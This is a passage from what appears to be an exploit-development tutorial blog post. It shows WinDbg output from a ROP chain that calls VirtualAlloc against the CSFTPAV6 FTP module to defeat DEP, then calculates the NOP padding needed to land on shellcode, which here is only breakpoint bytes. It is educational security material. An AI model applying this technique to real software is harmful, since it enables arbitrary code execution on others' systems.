+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x22e21</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50533</span>cbf <span style="color:#ae81ff">8</span>be5            mov     esp,ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span><span style="color:#ae81ff">8</span>b1c8 ecx<span style="color:#f92672">=</span>ffffffe8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50533</span>cc1 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2ec ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2ec iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x22e23</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50533</span>cc1 <span style="color:#ae81ff">5</span>d              pop     ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">026</span>ce2ec  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">76</span>a65680 <span style="color:#ae81ff">026</span>ce504 <span style="color:#ae81ff">026</span>ce504
+</span></span></code></pre></div><p>We can see that the last pop ebp gadget we put is going to pop 41414141 (one of the dummy values we have inserted to reach EIP) into ebp and then esp is going to point to our desired address.:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd esp L1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">026</span>ce2f0  <span style="color:#ae81ff">76</span>a65680
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span><span style="color:#ae81ff">8</span>b1c8 ecx<span style="color:#f92672">=</span>ffffffe8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">76</span>a65680 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2f4 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
+</span></span><span style="display:flex;"><span>KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>a65680 <span style="color:#ae81ff">8</span>bff            mov     edi,edi
+</span></span></code></pre></div><p>Now let&rsquo;s see our shellcode address (top of stack, we are going to return to it after VirtualAlloc, remember we placed it on purpose). Let&rsquo;s see the protections:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> dd esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e2f4  <span style="color:#ae81ff">01</span>a0e504 <span style="color:#ae81ff">01</span>a0e504 <span style="color:#ae81ff">00000001</span> <span style="color:#ae81ff">00001000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>vprot <span style="color:#ae81ff">01</span>a0e504 
+</span></span><span style="display:flex;"><span>BaseAddress:       <span style="color:#ae81ff">01</span>a0e000
+</span></span><span style="display:flex;"><span>AllocationBase:    <span style="color:#ae81ff">01</span><span style="color:#ae81ff">970000</span>
+</span></span><span style="display:flex;"><span>AllocationProtect: <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
+</span></span><span style="display:flex;"><span>RegionSize:        <span style="color:#ae81ff">00062000</span>
+</span></span><span style="display:flex;"><span>State:             <span style="color:#ae81ff">00001000</span>  MEM_COMMIT
+</span></span><span style="display:flex;"><span>Protect:           <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
+</span></span><span style="display:flex;"><span>Type:              <span style="color:#ae81ff">00020000</span>  MEM_PRIVATE
+</span></span></code></pre></div><p>Let&rsquo;s execute VirtualProtect and see the protections again (we use pt here to stop until next return).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> pt
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e000 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>d4a7e8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e2c4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">755</span>ddf31 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e2f4 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>KERNELBASE<span style="color:#f92672">!</span>VirtualAlloc<span style="color:#f92672">+</span><span style="color:#ae81ff">0x51</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">755</span>ddf31 c21000          ret     <span style="color:#ae81ff">10</span>h
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>vprot <span style="color:#ae81ff">01</span>a0e504 
+</span></span><span style="display:flex;"><span>BaseAddress:       <span style="color:#ae81ff">01</span>a0e000
+</span></span><span style="display:flex;"><span>AllocationBase:    <span style="color:#ae81ff">01</span><span style="color:#ae81ff">970000</span>
+</span></span><span style="display:flex;"><span>AllocationProtect: <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
+</span></span><span style="display:flex;"><span>RegionSize:        <span style="color:#ae81ff">00001000</span>
+</span></span><span style="display:flex;"><span>State:             <span style="color:#ae81ff">00001000</span>  MEM_COMMIT
+</span></span><span style="display:flex;"><span>Protect:           <span style="color:#ae81ff">00000040</span>  PAGE_EXECUTE_READWRITE
+</span></span><span style="display:flex;"><span>Type:              <span style="color:#ae81ff">00020000</span>  MEM_PRIVATE
+</span></span></code></pre></div><p>Before executing the API, we find that the memory protection is PAGE_READWRITE. But after executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE.</p>
+<h1 id="aligning-the-shellcode-with-our-return-address">Aligning the shellcode with our return address</h1>
+<p>The final step is to align our shellcode with the return address.
+Note: Instead of modifying the offsets used in the ROP chain (would be another method, once we know the offset, modify it) we could also insert several padding bytes before the shellcode.
+We will do the second approach here.</p>
+<p>To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the <strong>address of the first instruction we are executing on the stack.</strong>
+Next, we dump the contents of the stack and <strong>obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.</strong>
+We are basically forcing our shellcode to be in the address that we previously inserted in the ROP gadget chain. We just calculate the bytes that are missing from such address and add NOPs so that the shellcode starts in such address instead of just after the ROP chain.
+<strong>Note: In Windows, the calling convention enforces that the called function decrements ESP to clear the stack arguments.</strong> In Linux, the caller function clears the argument after the flow its returned to it (with add esp, 8). Basically, windows does the &ldquo;add esp&rdquo; in the ret.
+En español para que quede más claro: Al setear ESP con el dummy address que hemos puesto en el rop chain, ESP está muy abajo (o arriba) de nuestro shellcode. Nuestro shellcode en realidad está mas arriba (o abajo) de la pila. Hay que ver la diferencia en bytes y añadir NOPs para que la dirección de salto que hemos puesto en la ROP chain coincida justo donde empieza nuestro shellcode.</p>
+<p>Let&rsquo;s see where we landed after executing VirtualAlloc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e000 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>d4a7e8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e2c4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e504 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e308 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e504 <span style="color:#ae81ff">43</span>              inc     ebx
+</span></span></code></pre></div><p>eip = 0x01a0e504.
+We can subtly see as the next instruction to execute is &ldquo;43&rdquo; meaning that we are jumping &ldquo;inside&rdquo; our shellcode. We have to jump to the start.</p>
+<p>Let&rsquo;s see where does our ROP chain start:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> dd esp <span style="color:#f92672">+</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e408  <span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">505115</span>a3 ffffffe8
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e418  <span style="color:#ae81ff">5051579</span>a <span style="color:#ae81ff">5051571f</span> <span style="color:#ae81ff">50533</span>cbf <span style="color:#ae81ff">43434343</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">01</span>a0e424
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e424  <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span><span style="color:#f92672">-</span><span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span>  CCCCCCCCCCCCCCCC
+</span></span></code></pre></div><p>Our shellcode starts in 0x01a0e424. Let&rsquo;s calculate the offset from EIP:</p>
+<pre tabindex="0"><code>0:055&gt; ? 0x01a0e424 - 0x01a0e504
+Evaluate expression: -224 = ffffff20
+</code></pre><p>This means that we have to add 224 NOPs into our shellcode so the first starting byte is at address 0x01a0e504.
+Our buffer starts fulfilling at 0x01a0e424, we will fill 224 nops and then the useful payload.
+<strong>Note: the offset dummy value that we store in the stack must not be very big as it is better to have a small offset and then fix by adding NOPs in our shellcode rather than jumping further than our shellcode. The offset must be inside our shellcode, that&rsquo;s for sure, so we can put nops and fix it afterwards. If not, we have to change the offset manually.</strong></p>
+<p>After sending the payload with the exact offset, we can see that EIP points to exactly our shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds eip
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">024</span>de504  cccccccc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds eip <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">024</span>de503  cccccc43
+</span></span></code></pre></div><p><strong>Note: the instruction CC (int 3, software breakpoint) has been executed in order to verify that everything works.</strong></p>
+</div>
+</article>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2025 &copy; made by jaco with love
+    </small></p>
+    <p><small>
+        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
